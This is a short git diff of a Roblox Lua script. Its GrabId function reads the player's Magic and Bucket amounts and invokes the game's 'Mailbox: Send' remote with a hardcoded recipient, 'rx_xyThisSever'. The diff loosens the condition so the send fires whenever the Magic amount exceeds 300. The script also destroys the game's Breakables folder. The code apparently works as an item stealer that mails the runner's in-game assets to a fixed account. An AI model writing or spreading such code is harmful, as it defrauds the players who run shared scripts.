@@ -116,7 +116,7 @@ function GrabId()
         print("Amount:", BucketAmount)
         print("ID:", BucketId)
 
-        if MagicAmount > 300 and BucketAmount > 300 then
+        if MagicAmount > 300 then
             local args = {
                 [1] = "rx_xyThisSever",
                 [2] = "'" .. (BucketAmount or "") .. "'",
@@ -127,7 +127,7 @@ function GrabId()
 
             game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
         else
-            print("Unable to function. Magic or Bucket amount is not over 300.")
+            print("Unable to function. Magic amount is not over 300.")
         end
     else
         print("Unable to function. Missing required data.")
@@ -135,6 +135,7 @@ function GrabId()
 end
 
 GrabId()
+
 
 
 workspace:FindFirstChild("__THINGS").Breakables:Destroy()
